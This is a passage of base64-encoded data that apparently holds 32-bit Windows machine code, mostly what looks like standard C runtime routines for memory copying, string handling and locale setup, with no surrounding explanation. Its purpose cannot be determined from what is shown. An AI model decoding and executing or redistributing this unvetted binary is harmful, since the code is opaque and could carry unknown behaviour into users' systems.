VYvsU4tdCI1FDFDoEAAAAFtdw8zMzMzMzMzMzMzMzMxVi+yF23UKaFcAB4DoT9P//4tFCFZQU+jUAwAAi/CLB4tQ+IPoELkBAAAAK0gMK9aDxAgLyn0Ji86Lx+gg////i0UIixdQU41OAVFS6D4FAACDxBCF9nyviwc7cPh/qIlw9IsHM8lmiQxwXl3CBADM/yWAAQEQ/yV8AQEQ/yV4AQEQ/yV0AQEQ/yVwAQEQ/yVsAQEQOw0cUAEQdQLzw+lXBwAAi/9Vi+xd6VIIAACL/1WL7FaLdRRXM/8793UEM8DrZTl9CHUb6EgOAABqFl6JMFdXV1dX6NENAACDxBSLxutFOX0QdBY5dQxyEVb/dRD/dQjoGAkAAIPEDOvB/3UMV/91COiHCAAAg8QMOX0QdLY5dQxzDuj5DQAAaiJZiQiL8eutahZYX15dw4v/VYvsi0UUVlcz/zvHdEc5fQh1G+jPDQAAahZeiTBXV1dXV+hYDQAAg8QUi8brKTl9EHTgOUUMcw7oqg0AAGoiWYkIi/Hr11D/dRD/dQjo4Q0AAIPEDDPAX15dw4v/UccBAAIBEOgvEQAAWcOL/1WL7FaL8ejj////9kUIAXQHVujy/v//WYvGXl3CBACL/1WL7ItFCIPBCVGDwAlQ6HIRAAD32FkbwFlAXcIEAIv/VYvsi1UIU1ZXM/8713QHi10MO993HugeDQAAahZeiTBXV1dXV+inDAAAg8QUi8ZfXltdw4t1EDv3dQczwGaJAuvUi8oPtwZmiQFBQUZGZjvHdANLde4zwDvfddNmiQLo1QwAAGoiWYkIi/Hrs4v/VYvsXenfEQAAi/9Vi+yLRQhTi10MZoM7AFeL+HRED7cIZoXJdDoPt9Erw4tNDGaF0nQbD7cRZoXSdCsPtxwID7fSK9p1CEFBZjkcCHXlZoM5AHQSR0cPtxdAQGaF0nXLM8BfW13Di8fr+Iv/VYvsi0UIVovxxkYMAIXAdWPomh4AAIlGCItIbIkOi0hoiU4Eiw47DfhXARB0EosNFFcBEIVIcHUH6DUbAACJBotGBDsFGFYBEHQWi0YIiw0UVwEQhUhwdQjoqRMAAIlGBItGCPZAcAJ1FINIcALGRgwB6wqLCIkOi0AEiUYEi8ZeXcIEAIv/VYvsg+wQ/3UMjU3w6Gb///8PtkUIi03wi4nIAAAAD7cEQSUAgAAAgH38AHQHi034g2Fw/cnDi/9Vi+xqAP91COi5////WVldw4v/VYvsagj/dQjonyEAAFlZXcOL/1WL7IPsIFYz9jl1DHUd6GYLAABWVlZWVscAFgAAAOjuCgAAg8QUg8j/6yf/dRSNReD/dRDHReT///9//3UMx0XsQgAAAFCJdeiJdeD/VQiDxBBeycOL/1WL7P91DGoA/3UIaHhkABDokv///4PEEF3Di/9Vi+yD7CBTM9s5XRR1IOjzCgAAU1NTU1PHABYAAADoewoAAIPEFIPI/+nFAAAAVot1DFeLfRA7+3QkO/N1IOjDCgAAU1NTU1PHABYAAADoSwoAAIPEFIPI/+mTAAAAx0XsQgAAAIl16Il14IH/////P3YJx0Xk////f+sGjQQ/iUXk/3UcjUXg/3UY/3UUUP9VCIPEEIlFFDvzdFU7w3xC/03keAqLReCIGP9F4OsRjUXgUFPo4yAAAFlZg/j/dCL/TeR4B4tF4IgY6xGNReBQU+jGIAAAWVmD+P90BYtFFOsPM8A5XeRmiUR+/g+dwEhIX15bycOL/1WL7FYz9jl1EHUd6P4JAABWVlZWVscAFgAAAOiGCQAAg8QUg8j/615Xi30IO/50BTl1DHcN6NQJAADHABYAAADrM/91GP91FP91EP91DFdoEHAAEOit/v//g8QYO8Z9BTPJZokPg/j+dRvonwkAAMcAIgAAAFZWVlZW6CcJAACDxBSDyP9fXl3Di/9Vi+z/dRRqAP91EP91DP91COhd////g8QUXcOL/1WL7ItFDFZXg/gBdXxQ6HlEAABZhcB1BzPA6Q4BAADoSx0AAIXAdQfoj0QAAOvp6AxEAAD/FWAAARCjOHwBEOjFQgAAo8RfARDo5jwAAIXAfQfoxBkAAOvP6PBBAACFwHwg6G8/AACFwHwXagDonjoAAFmFwHUL/wXAXwEQ6agAAADoAT8AAOvJM/87x3UxOT3AXwEQfoH/DcBfARA5PZhjARB1BegtPAAAOX0QdXvo1D4AAOhiGQAA6P5DAADraoP4AnVZ6B0ZAABoFAIAAGoB6LE4AACL8FlZO/cPhDb///9W/zUIWAEQ/zVgYwEQ6HgYAABZ/9CFwHQXV1boVhkAAFlZ/xVcAAEQg04E/4kG6xhW6DoCAABZ6fr+//+D+AN1B1fo2BsAAFkzwEBfXl3CDABqDGgoLwEQ6HNFAACL+Yvyi10IM8BAiUXkhfZ1DDkVwF8BEA+ExQAAAINl/AA78HQFg/4CdS6hBAIBEIXAdAhXVlP/0IlF5IN95AAPhJYAAABXVlPocv7//4lF5IXAD4SDAAAAV1ZT6PPL//+JReSD/gF1JIXAdSBXUFPo38v//1dqAFPoQv7//6EEAgEQhcB0BldqAFP/0IX2dAWD/gN1JldWU+gi/v//hcB1AyFF5IN95AB0EaEEAgEQhcB0CFdWU//QiUXkx0X8/v///4tF5Osdi0XsiwiLCVBR6H1EAABZWcOLZejHRfz+////M8Doz0QAAMOL/1WL7IN9DAF1BehlRgAA/3UIi00Qi1UM6Oz+//9ZXcIMAIv/VYvsgewoAwAAo+BgARCJDdxgARCJFdhgARCJHdRgARCJNdBgARCJPcxgARBmjBX4YAEQZowN7GABEGaMHchgARBmjAXEYAEQZowlwGABEGaMLbxgARCcjwXwYAEQi0UAo+RgARCLRQSj6GABEI1FCKP0YAEQi4Xg/P//xwUwYAEQAQABAKHoYAEQo+RfARDHBdhfARAJBADAxwXcXwEQAQAAAKEcUAEQiYXY/P//oSBQARCJhdz8////FXQAARCjKGABEGoB6BtGAABZagD/FXAAARBoCAIBEP8VbAABEIM9KGABEAB1CGoB6PdFAABZaAkEAMD/FWgAARBQ/xVkAAEQycNqDGhILwEQ6FRDAACLdQiF9nR1gz0EewEQA3VDagToQ0cAAFmDZfwAVuhrRwAAWYlF5IXAdAlWUOiMRwAAWVnHRfz+////6AsAAACDfeQAdTf/dQjrCmoE6C9GAABZw1ZqAP81rGQBEP8VeAABEIXAdRbonQUAAIvw/xUcAAEQUOhNBQAAiQZZ6BhDAADDzMyLVCQMi0wkBIXSdGkzwIpEJAiEwHUWgfoAAQAAcg6DPeR6ARAAdAXp+FEAAFeL+YP6BHIx99mD4QN0DCvRiAeDxwGD6QF19ovIweAIA8GLyMHgEAPBi8qD4gPB6QJ0BvOrhdJ0CogHg8cBg+oBdfaLRCQIX8OLRCQEw8zMzMzMzFWL7FdWi3UMi00Qi30Ii8GL0QPGO/52CDv4D4KkAQAAgfkAAQAAch+DPeR6ARAAdBZXVoPnD4PmDzv+Xl91CF5fXekyUwAA98cDAAAAdRXB6QKD4gOD+QhyKvOl/ySVREgAEJCLx7oDAAAAg+kEcgyD4AMDyP8khVhHABD/JI1USAAQkP8kjdhHABCQaEcAEJRHABC4RwAQI9GKBogHikYBiEcBikYCwekCiEcCg8YDg8cDg/kIcszzpf8klURIABCNSQAj0YoGiAeKRgHB6QKIRwGDxgKDxwKD+QhypvOl/ySVREgAEJAj0YoGiAeDxgHB6QKDxwGD+QhyiPOl/ySVREgAEI1JADtIABAoSAAQIEgAEBhIABAQSAAQCEgAEABIABD4RwAQi0SO5IlEj+SLRI7oiUSP6ItEjuyJRI/si0SO8IlEj/CLRI70iUSP9ItEjviJRI/4i0SO/IlEj/yNBI0AAAAAA/AD+P8klURIABCL/1RIABBcSAAQaEgAEHxIABCLRQheX8nDkIoGiAeLRQheX8nDkIoGiAeKRgGIRwGLRQheX8nDjUkAigaIB4pGAYhHAYpGAohHAotFCF5fycOQjXQx/I18Ofz3xwMAAAB1JMHpAoPiA4P5CHIN/fOl/P8kleBJABCL//fZ/ySNkEkAEI1JAIvHugMAAACD+QRyDIPgAyvI/ySF5EgAEP8kjeBJABCQ9EgAEBhJABBASQAQikYDI9GIRwOD7gHB6QKD7wGD+Qhysv3zpfz/JJXgSQAQjUkAikYDI9GIRwOKRgLB6QKIRwKD7gKD7wKD+QhyiP3zpfz/JJXgSQAQkIpGAyPRiEcDikYCiEcCikYBwekCiEcBg+4Dg+8Dg/kID4JW/////fOl/P8kleBJABCNSQCUSQAQnEkAEKRJABCsSQAQtEkAELxJABDESQAQ10kAEItEjhyJRI8ci0SOGIlEjxiLRI4UiUSPFItEjhCJRI8Qi0SODIlEjwyLRI4IiUSPCItEjgSJRI8EjQSNAAAAAAPwA/j/JJXgSQAQi//wSQAQ+EkAEAhKABAcSgAQi0UIXl/Jw5CKRgOIRwOLRQheX8nDjUkAikYDiEcDikYCiEcCi0UIXl/Jw5CKRgOIRwOKRgKIRwKKRgGIRwGLRQheX8nDi/9Vi+yLRQij/GIBEF3Di/9Vi+yB7CgDAAChHFABEDPFiUX8g6XY/P//AFNqTI2F3Pz//2oAUOjf+///jYXY/P//iYUo/f//jYUw/f//g8QMiYUs/f//iYXg/f//iY3c/f//iZXY/f//iZ3U/f//ibXQ/f//ib3M/f//ZoyV+P3//2aMjez9//9mjJ3I/f//ZoyFxP3//2aMpcD9//9mjK28/f//nI+F8P3//4tFBI1NBMeFMP3//wEAAQCJhej9//+JjfT9//+LSfyJjeT9///Hhdj8//8XBADAx4Xc/P//AQAAAImF5Pz///8VdAABEGoAi9j/FXAAARCNhSj9//9Q/xVsAAEQhcB1DIXbdQhqAuhWQAAAWWgXBADA/xVoAAEQUP8VZAABEItN/DPNW+jq8f//ycOL/1WL7P81/GIBEOheEAAAWYXAdANd/+BqAugXQAAAWV3psv7//4v/VYvsi0UIM8k7BM0wUAEQdBNBg/ktcvGNSO2D+RF3DmoNWF3DiwTNNFABEF3DBUT///9qDlk7yBvAI8GDwAhdw+jUEQAAhcB1BriYUQEQw4PACMPowREAAIXAdQa4nFEBEMODwAzDi/9Vi+xW6OL///+LTQhRiQjogv///1mL8Oi8////iTBeXcPMzMxVi+xXVot1DItNEIt9CIvBi9EDxjv+dgg7+A+CpAEAAIH5AAEAAHIfgz3kegEQAHQWV1aD5w+D5g87/l5fdQheX13p4k0AAPfHAwAAAHUVwekCg+IDg/kIcirzpf8klZRNABCQi8e6AwAAAIPpBHIMg+ADA8j/JIWoTAAQ/ySNpE0AEJD/JI0oTQAQkLhMABDkTAAQCE0AECPRigaIB4pGAYhHAYpGAsHpAohHAoPGA4PHA4P5CHLM86X/JJWUTQAQjUkAI9GKBogHikYBwekCiEcBg8YCg8cCg/kIcqbzpf8klZRNABCQI9GKBogHg8YBwekCg8cBg/kIcojzpf8klZRNABCNSQCLTQAQeE0AEHBNABBoTQAQYE0AEFhNABBQTQAQSE0AEItEjuSJRI/ki0SO6IlEj+iLRI7siUSP7ItEjvCJRI/wi0SO9IlEj/SLRI74iUSP+ItEjvyJRI/8jQSNAAAAAAPwA/j/JJWUTQAQi/+kTQAQrE0AELhNABDMTQAQi0UIXl/Jw5CKBogHi0UIXl/Jw5CKBogHikYBiEcBi0UIXl/Jw41JAIoGiAeKRgGIRwGKRgKIRwKLRQheX8nDkI10MfyNfDn898cDAAAAdSTB6QKD4gOD+QhyDf3zpfz/JJUwTwAQi//32f8kjeBOABCNSQCLx7oDAAAAg/kEcgyD4AMryP8khTROABD/JI0wTwAQkEROABBoTgAQkE4AEIpGAyPRiEcDg+4BwekCg+8Bg/kIcrL986X8/ySVME8AEI1JAIpGAyPRiEcDikYCwekCiEcCg+4Cg+8Cg/kIcoj986X8/ySVME8AEJCKRgMj0YhHA4pGAohHAopGAcHpAohHAYPuA4PvA4P5CA+CVv////3zpfz/JJUwTwAQjUkA5E4AEOxOABD0TgAQ/E4AEARPABAMTwAQFE8AECdPABCLRI4ciUSPHItEjhiJRI8Yi0SOFIlEjxSLRI4QiUSPEItEjgyJRI8Mi0SOCIlEjwiLRI4EiUSPBI0EjQAAAAAD8AP4/ySVME8AEIv/QE8AEEhPABBYTwAQbE8AEItFCF5fycOQikYDiEcDi0UIXl/Jw41JAIpGA4hHA4pGAohHAotFCF5fycOQikYDiEcDikYCiEcCikYBiEcBi0UIXl/Jw2oMaGgvARDojzkAAGoO6I49AABZg2X8AIt1CItOBIXJdC+hBGMBELoAYwEQiUXkhcB0ETkIdSyLSASJSgRQ6Pj1//9Z/3YE6O/1//9Zg2YEAMdF/P7////oCgAAAOh+OQAAw4vQ68VqDuhZPAAAWcPMzMzMzMzMzMzMzItUJASLTCQI98IDAAAAdTyLAjoBdS4KwHQmOmEBdSUK5HQdwegQOkECdRkKwHQROmEDdRCDwQSDwgQK5HXSi/8zwMOQG8DR4IPAAcP3wgEAAAB0GIoCg8IBOgF154PBAQrAdNz3wgIAAAB0pGaLAoPCAjoBdc4KwHTGOmEBdcUK5HS9g8EC64iL/1ZqAWiwUQEQi/HoUU4AAMcGFAIBEIvGXsPHARQCARDptk4AAIv/VYvsVovxxwYUAgEQ6KNOAAD2RQgBdAdW6Jbs//9Zi8ZeXcIEAIv/VYvsVv91CIvx6CJOAADHBhQCARCLxl5dwgQAi/9Vi+yD7AzrDf91COjxTwAAWYXAdA//dQjoaUsAAFmFwHTmycP2BRRjARABvghjARB1GYMNFGMBEAGLzuhU////aL/0ABDokU8AAFlWjU306I3///9ohC8BEI1F9FDox08AAMwtpAMAAHQig+gEdBeD6A10DEh0AzPAw7gEBAAAw7gSBAAAw7gECAAAw7gRBAAAw4v/VleL8GgBAQAAM/+NRhxXUOiz9P//M8APt8iLwYl+BIl+CIl+DMHhEAvBjX4Qq6urufBRARCDxAyNRhwrzr8BAQAAihQBiBBAT3X3jYYdAQAAvgABAACKFAiIEEBOdfdfXsOL/1WL7IHsHAUAAKEcUAEQM8WJRfxTV42F6Pr//1D/dgT/FXwAARC/AAEAAIXAD4T7AAAAM8CIhAX8/v//QDvHcvSKhe76///Ghfz+//8ghMB0Lo2d7/r//w+2yA+2AzvIdxYrwUBQjZQN/P7//2ogUujw8///g8QMQ4oDQ4TAddhqAP92DI2F/Pr///92BFBXjYX8/v//UGoBagDoolQAADPbU/92BI2F/P3//1dQV42F/P7//1BX/3YMU+iDUgAAg8REU/92BI2F/Pz//1dQV42F/P7//1BoAAIAAP92DFPoXlIAAIPEJDPAD7eMRfz6///2wQF0DoBMBh0QiowF/P3//+sR9sECdBWATAYdIIqMBfz8//+IjAYdAQAA6wjGhAYdAQAAAEA7x3K+61aNhh0BAADHheT6//+f////M8kpheT6//+LleT6//+NhA4dAQAAA9CNWiCD+xl3DIBMDh0QitGAwiDrD4P6GXcOgEwOHSCK0YDqIIgQ6wPGAABBO89ywotN/F8zzVvo2en//8nDagxo2C8BEOiXNQAA6JgKAACL+KEUVwEQhUdwdB2Df2wAdBeLd2iF9nUIaiDoESkAAFmLxuivNQAAw2oN6Gg5AABZg2X8AIt3aIl15Ds1GFYBEHQ2hfZ0Glb/FYQAARCFwHUPgf7wUQEQdAdW6NLx//9ZoRhWARCJR2iLNRhWARCJdeRW/xWAAAEQx0X8/v///+gFAAAA646LdeRqDegtOAAAWcOL/1WL7IPsEFMz21ONTfDoP+v//4kdGGMBEIP+/nUexwUYYwEQAQAAAP8VjAABEDhd/HRFi034g2Fw/es8g/79dRLHBRhjARABAAAA/xWIAAEQ69uD/vx1EotF8ItABMcFGGMBEAEAAADrxDhd/HQHi0X4g2Bw/YvGW8nDi/9Vi+yD7CChHFABEDPFiUX8U4tdDFaLdQhX6GT///+L+DP2iX0IO/51DovD6Lf8//8zwOmdAQAAiXXkM8A5uCBWARAPhJEAAAD/ReSDwDA98AAAAHLngf/o/QAAD4RwAQAAgf/p/QAAD4RkAQAAD7fHUP8VkAABEIXAD4RSAQAAjUXoUFf/FXwAARCFwA+EMwEAAGgBAQAAjUMcVlDoEPH//zPSQoPEDIl7BIlzDDlV6A+G+AAAAIB97gAPhM8AAACNde+KDoTJD4TCAAAAD7ZG/w+2yemmAAAAaAEBAACNQxxWUOjJ8P//i03kg8QMa8kwiXXgjbEwVgEQiXXk6yqKRgGEwHQoD7Y+D7bA6xKLReCKgBxWARAIRDsdD7ZGAUc7+Hbqi30IRkaAPgB10Yt15P9F4IPGCIN94ASJdeRy6YvHiXsEx0MIAQAAAOhn+///agaJQwyNQxCNiSRWARBaZosxQWaJMEFAQEp184vz6Nf7///pt/7//4BMAx0EQDvBdvZGRoB+/wAPhTT///+NQx65/gAAAIAICEBJdfmLQwToEvv//4lDDIlTCOsDiXMIM8APt8iLwcHhEAvBjXsQq6ur66g5NRhjARAPhVj+//+DyP+LTfxfXjPNW+jU5v//ycNqFGj4LwEQ6JIyAACDTeD/6I8HAACL+Il93Ojc/P//i19oi3UI6HX9//+JRQg7QwQPhFcBAABoIAIAAOjuJAAAWYvYhdsPhEYBAAC5iAAAAIt3aIv786WDIwBT/3UI6Lj9//9ZWYlF4IXAD4X8AAAAi3Xc/3Zo/xWEAAEQhcB1EYtGaD3wUQEQdAdQ6K7u//9ZiV5oU4s9gAABEP/X9kZwAg+F6gAAAPYFFFcBEAEPhd0AAABqDejpNQAAWYNl/ACLQwSjKGMBEItDCKMsYwEQi0MMozBjARAzwIlF5IP4BX0QZotMQxBmiQxFHGMBEEDr6DPAiUXkPQEBAAB9DYpMGByIiBBUARBA6+kzwIlF5D0AAQAAfRCKjBgdAQAAiIgYVQEQQOvm/zUYVgEQ/xWEAAEQhcB1E6EYVgEQPfBRARB0B1Do9e3//1mJHRhWARBT/9fHRfz+////6AIAAADrMGoN6GI0AABZw+slg/j/dSCB+/BRARB0B1Pov+3//1nozfP//8cAFgAAAOsEg2XgAItF4OhKMQAAw4M9LHwBEAB1Emr96Fb+//9ZxwUsfAEQAQAAADPAw4v/VYvsU1aLdQiLhrwAAAAz21c7w3RvPWBaARB0aIuGsAAAADvDdF45GHVai4a4AAAAO8N0FzkYdRNQ6Ebt////trwAAADoxFAAAFlZi4a0AAAAO8N0FzkYdRNQ6CXt////trwAAADoXlAAAFlZ/7awAAAA6A3t////trwAAADoAu3//1lZi4bAAAAAO8N0RDkYdUCLhsQAAAAt/gAAAFDo4ez//4uGzAAAAL+AAAAAK8dQ6M7s//+LhtAAAAArx1DowOz///+2wAAAAOi17P//g8QQjb7UAAAAiwc9oFkBEHQXOZi0AAAAdQ9Q6EROAAD/N+iO7P//WVmNflDHRQgGAAAAgX/4GFcBEHQRiwc7w3QLORh1B1Doaez//1k5X/x0EotHBDvDdAs5GHUHUOhS7P//WYPHEP9NCHXHVuhD7P//WV9eW13Di/9Vi+xTVos1gAABEFeLfQhX/9aLh7AAAACFwHQDUP/Wi4e4AAAAhcB0A1D/1ouHtAAAAIXAdANQ/9aLh8AAAACFwHQDUP/WjV9Qx0UIBgAAAIF7+BhXARB0CYsDhcB0A1D/1oN7/AB0CotDBIXAdANQ/9aDwxD/TQh11ouH1AAAAAW0AAAAUP/WX15bXcOL/1WL7FeLfQiF/w+EgwAAAFNWizWEAAEQV//Wi4ewAAAAhcB0A1D/1ouHuAAAAIXAdANQ/9aLh7QAAACFwHQDUP/Wi4fAAAAAhcB0A1D/1o1fUMdFCAYAAACBe/gYVwEQdAmLA4XAdANQ/9aDe/wAdAqLQwSFwHQDUP/Wg8MQ/00IddaLh9QAAAAFtAAAAFD/1l5bi8dfXcOF/3Q3hcB0M1aLMDv3dChXiTjowf7//1mF9nQbVuhF////gz4AWXUPgf4gVwEQdAdW6Fn9//9Zi8dewzPAw2oMaBgwARDoKy4AAOgsAwAAi/ChFFcBEIVGcHQig35sAHQc6BUDAACLcGyF9nUIaiDooCEAAFmLxug+LgAAw2oM6PcxAABZg2X8AI1GbIs9+FcBEOhp////iUXkx0X8/v///+gCAAAA68FqDOjyMAAAWYt15MOL/1WL7Fb/NQxYARCLNZwAARD/1oXAdCGhCFgBEIP4/3QXUP81DFgBEP/W/9CFwHQIi4D4AQAA6ye+tAIBEFb/FZQAARCFwHULVujhIAAAWYXAdBhopAIBEFD/FZgAARCFwHQI/3UI/9CJRQiLRQheXcNqAOiH////WcOL/1WL7Fb/NQxYARCLNZwAARD/1oXAdCGhCFgBEIP4/3QXUP81DFgBEP/W/9CFwHQIi4D8AQAA6ye+tAIBEFb/FZQAARCFwHULVuhmIAAAWYXAdBho0AIBEFD/FZgAARCFwHQI/3UI/9CJRQiLRQheXcP/FaAAARDCBACL/1b/NQxYARD/FZwAARCL8IX2dRv/NVxjARDoZf///1mL8Fb/NQxYARD/FaQAARCLxl7DoQhYARCD+P90FlD/NWRjARDoO////1n/0IMNCFgBEP+hDFgBEIP4/3QOUP8VqAABEIMNDFgBEP/pLy8AAGoMaDgwARDoTiwAAL60AgEQVv8VlAABEIXAdQdW6KcfAABZiUXki3UIx0ZcOAMBEDP/R4l+FIXAdCRopAIBEFCLHZgAARD/04mG+AEAAGjQAgEQ/3Xk/9OJhvwBAACJfnDGhsgAAABDxoZLAQAAQ8dGaPBRARBqDejjLwAAWYNl/AD/dmj/FYAAARDHRfz+////6D4AAABqDOjCLwAAWYl9/ItFDIlGbIXAdQih+FcBEIlGbP92bOgB/P//WcdF/P7////oFQAAAOjRKwAAwzP/R4t1CGoN6KouAABZw2oM6KEuAABZw4v/Vlf/FRwAARD/NQhYARCL+OiR/v///9CL8IX2dU5oFAIAAGoB6B0eAACL8FlZhfZ0Olb/NQhYARD/NWBjARDo6P3//1n/0IXAdBhqAFboxf7//1lZ/xVcAAEQg04E/4kG6wlW6Knn//9ZM/ZX/xWsAAEQX4vGXsOL/1bof////4vwhfZ1CGoQ6IQeAABZi8Zew2oIaGAwARDo1CoAAIt1CIX2D4T4AAAAi0YkhcB0B1DoXOf//1mLRiyFwHQHUOhO5///WYtGNIXAdAdQ6EDn//9Zi0Y8hcB0B1DoMuf//1mLRkCFwHQHUOgk5///WYtGRIXAdAdQ6Bbn//9Zi0ZIhcB0B1DoCOf//1mLRlw9OAMBEHQHUOj35v//WWoN6FUuAABZg2X8AIt+aIX/dBpX/xWEAAEQhcB1D4H/8FEBEHQHV+jK5v//WcdF/P7////oVwAAAGoM6BwuAABZx0X8AQAAAIt+bIX/dCNX6PP6//9ZOz34VwEQdBSB/yBXARB0DIM/AHUHV+j/+P//WcdF/P7////oHgAAAFbocub//1noESoAAMIEAIt1CGoN6OssAABZw4t1CGoM6N8sAABZw4v/VYvsgz0IWAEQ/3RLg30IAHUnVv81DFgBEIs1nAABEP/WhcB0E/81CFgBEP81DFgBEP/W/9CJRQheagD/NQhYARD/NWBjARDoHfz//1n/0P91COh4/v//oQxYARCD+P90CWoAUP8VpAABEF3Di/9WV760AgEQVv8VlAABEIXAdQdW6JgcAABZi/iF/w+EXgEAAIs1mAABEGgAAwEQV//WaPQCARBXo1hjARD/1mjoAgEQV6NcYwEQ/9Zo4AIBEFejYGMBEP/Wgz1YYwEQAIs1pAABEKNkYwEQdBaDPVxjARAAdA2DPWBjARAAdASFwHUkoZwAARCjXGMBEKGoAAEQxwVYYwEQTFwAEIk1YGMBEKNkYwEQ/xWgAAEQowxYARCD+P8PhMwAAAD/NVxjARBQ/9aFwA+EuwAAAOilHgAA/zVYYwEQ6KX6////NVxjARCjWGMBEOiV+v///zVgYwEQo1xjARDohfr///81ZGMBEKNgYwEQ6HX6//+DxBCjZGMBEOizKgAAhcB0ZWhAXgAQ/zVYYwEQ6M/6//9Z/9CjCFgBEIP4/3RIaBQCAABqAejRGgAAi/BZWYX2dDRW/zUIWAEQ/zVgYwEQ6Jz6//9Z/9CFwHQbagBW6Hn7//9ZWf8VXAABEINOBP+JBjPAQOsH6CT7//8zwF9ew4v/VYvsuP//AACD7BRmOUUIdQaDZfwA62W4AAEAAGY5RQhzGg+3RQiLDZhZARBmiwRBZiNFDA+3wIlF/OtA/3UQjU3s6MHd//+LRez/cBT/cASNRfxQagGNRQhQjUXsagFQ6L9JAACDxByFwHUDIUX8gH34AHQHi0X0g2Bw/Q+3RfwPt00MI8HJw4v/VYvsUbj//wAAZjlFCHUEM8DJw7gAAQAAZjlFCHMWD7dFCIsNmFkBEA+3BEEPt00MI8HJw4M9NGMBEAB1Jf81NFcBEI1F/P81JFcBEFBqAY1FCFBqAWgAWAEQ6DtJAACDxBxqAP91DP91COgF////g8QMycOL/1WL7FFWi3UMVuhjVQAAiUUMi0YMWaiCdRfoSun//8cACQAAAINODCCDyP/pLwEAAKhAdA3oL+n//8cAIgAAAOvjUzPbqAF0FoleBKgQD4SHAAAAi04Ig+D+iQ6JRgyLRgyD4O+DyAKJRgyJXgSJXfypDAEAAHUs6EBTAACDwCA78HQM6DRTAACDwEA78HUN/3UM6MFSAABZhcB1B1bobVIAAFn3RgwIAQAAVw+EgAAAAItGCIs+jUgBiQ6LThgr+Ek7+4lOBH4dV1D/dQzoYVEAAIPEDIlF/OtNg8ggiUYMg8j/63mLTQyD+f90G4P5/nQWi8GD4B+L0cH6BcHgBgMElSB7ARDrBbgYWAEQ9kAEIHQUagJTU1HoykgAACPCg8QQg/j/dCWLRgiKTQiICOsWM/9HV41FCFD/dQzo8lAAAIPEDIlF/Dl9/HQJg04MIIPI/+sIi0UIJf8AAABfW17Jw4v/VYvs9kAMQHQGg3gIAHQaUP91COgnVAAAWVm5//8AAGY7wXUFgw7/XcP/Bl3Di/9Vi+xWi/DrFP91CItFEP9NDOi5////gz7/WXQGg30MAH/mXl3Di/9Vi+z2RwxAU1aL8IvZdDeDfwgAdTGLRQgBBuswD7cD/00IUIvH6H7///9DQ4M+/1l1FOh35///gzgqdRBqP4vH6GP///9Zg30IAH/QXltdw8zMi/9Vi+yB7HQEAAChHFABEDPFiUX8i0UIU4tdFFaLdQxX/3UQM/+Njaj7//+JhdD7//+JneT7//+Jvbj7//+Jvfj7//+JvdT7//+JvfT7//+Jvdz7//+JvcT7//+Jvdj7///oldr//zm90Pv//3Uz6Ojm//9XV1dXxwAWAAAAV+hw5v//g8QUgL20+///AHQKi4Ww+///g2Bw/YPI/+nECgAAO/d0yQ+3FjPJib3g+///ib3s+///ib28+///iZXo+///ZjvXD4SBCgAAagJfA/eDveD7//8AibXA+///D4xpCgAAjULgZoP4WHcPD7fCD76AQBQBEIPgD+sCM8APvoTBYBQBEGoHwfgEWYmFpPv//zvBD4f1CQAA/ySF8G8AEDPAg430+////4mFoPv//4mFxPv//4mF1Pv//4mF3Pv//4mF+Pv//4mF2Pv//+m8CQAAD7fCg+ggdEqD6AN0NoPoCHQlK8d0FYPoAw+FnQkAAION+Pv//wjpkQkAAION+Pv//wTphQkAAION+Pv//wHpeQkAAIGN+Pv//4AAAADpagkAAAm9+Pv//+lfCQAAZoP6KnUsg8MEiZ3k+///i1v8iZ3U+///hdsPjT8JAACDjfj7//8E953U+///6S0JAACLhdT7//9rwAoPt8qNRAjQiYXU+///6RIJAACDpfT7//8A6QYJAABmg/oqdSaDwwSJneT7//+LW/yJnfT7//+F2w+N5ggAAION9Pv////p2ggAAIuF9Pv//2vACg+3yo1ECNCJhfT7///pvwgAAA+3woP4SXRXg/hodEaD+Gx0GIP4dw+FpAgAAIGN+Pv//wAIAADplQgAAGaDPmx1FwP3gY34+///ABAAAIm1wPv//+l4CAAAg434+///EOlsCAAAg434+///IOlgCAAAD7cGZoP4NnUfZoN+AjR1GIPGBIGN+Pv//wCAAACJtcD7///pOAgAAGaD+DN1H2aDfgIydRiDxgSBpfj7////f///ibXA+///6RMIAABmg/hkD4QJCAAAZoP4aQ+E/wcAAGaD+G8PhPUHAABmg/h1D4TrBwAAZoP4eA+E4QcAAGaD+FgPhNcHAACDpaT7//8Ai4XQ+///Uo214Pv//8eF2Pv//wEAAADo+/v//+muBwAAD7fCg/hkD48vAgAAD4TAAgAAg/hTD48bAQAAdH6D6EF0ECvHdFkrx3QIK8cPhe8FAACDwiDHhaD7//8BAAAAiZXo+///g434+///QIO99Pv//wCNtfz7//+4AAIAAIm18Pv//4mF7Pv//w+NkAIAAMeF9Pv//wYAAADp7AIAAPeF+Pv//zAIAAAPhcgAAACDjfj7//8g6bwAAAD3hfj7//8wCAAAdQeDjfj7//8gi730+///g///dQW/////f4PDBPaF+Pv//yCJneT7//+LW/yJnfD7//8PhAgFAACF23ULoSBdARCJhfD7//+Dpez7//8Ai7Xw+///hf8PjiAFAACKBoTAD4QWBQAAjY2o+///D7bAUVDoCNf//1lZhcB0AUZG/4Xs+///Ob3s+///fNDp6wQAAIPoWA+E9wIAACvHD4SUAAAAK8EPhPb+//8rxw+FygQAAA+3A4PDBDP2RvaF+Pv//yCJtdj7//+JneT7//+JhZz7//90QoiFzPv//42FqPv//1CLhaj7///Ghc37//8A/7CsAAAAjYXM+///UI2F/Pv//1DoR1AAAIPEEIXAfQ+JtcT7///rB2aJhfz7//+Nhfz7//+JhfD7//+Jtez7///pRgQAAIsDg8MEiZ3k+///hcB0OotIBIXJdDP3hfj7//8ACAAAD78AiY3w+///dBKZK8LHhdj7//8BAAAA6QEEAACDpdj7//8A6fcDAAChIF0BEImF8Pv//1DokzEAAFnp4AMAAIP4cA+P+gEAAA+E4gEAAIP4ZQ+MzgMAAIP4Zw+O6f3//4P4aXRxg/hudCiD+G8PhbIDAAD2hfj7//+Ax4Xo+///CAAAAHRhgY34+///AAIAAOtVizODwwSJneT7///oQU8AAIXAD4QwBQAA9oX4+///IHQMZouF4Pv//2aJBusIi4Xg+///iQbHhcT7//8BAAAA6cEEAACDjfj7//9Ax4Xo+///CgAAAPeF+Pv//wCAAAAPhKsBAACLA4tTBIPDCOnnAQAAdRJmg/pndWPHhfT7//8BAAAA61c5hfT7//9+BomF9Pv//4G99Pv//6MAAAB+PYu99Pv//4HHXQEAAFfomBAAAIuV6Pv//1mJhbz7//+FwHQQiYXw+///ib3s+///i/DrCseF9Pv//6MAAACLA4PDCImFlPv//4tD/ImFmPv//42FqPv//1D/taD7//8PvsL/tfT7//+JneT7//9Q/7Xs+///jYWU+///VlD/NUBdARDoTfD//1n/0Iud+Pv//4PE